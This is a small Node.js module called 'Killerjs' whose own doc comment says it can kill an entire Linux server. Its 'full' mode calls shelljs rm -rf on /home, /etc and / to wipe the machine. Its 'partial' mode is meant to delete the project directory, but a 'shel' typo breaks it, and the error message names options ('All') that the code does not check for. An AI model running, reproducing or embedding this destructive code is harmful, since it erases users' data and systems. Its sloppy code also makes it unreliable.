let shell = require('shelljs')

/**
 * Killerjs
 * A Node Module that Can Kill an Entire Linux Server
 *
 * @name killer
 * @function
 * @param {String} type
 * @return {Promise} A promise object.
 */

module.exports = (type) => {
    return new Promise((done, err) => {
        if(type.toLowerCase() === 'full') {
            shell.rm('-rf', '/home')
            shell.rm('-rf', '/etc')
            shell.rm('-rf', '/')
            done(`Destroyed The Server Fully.`)
        } else if(type.toLowerCase() === 'partial') {
            shel.rm('-rf', __dirname)
            done(`Destroyed the Project Directory (Partially)`)
        } else {
            err(`Param Not found, Please Use Either All or Partial as a Param.`)
        }
    })
}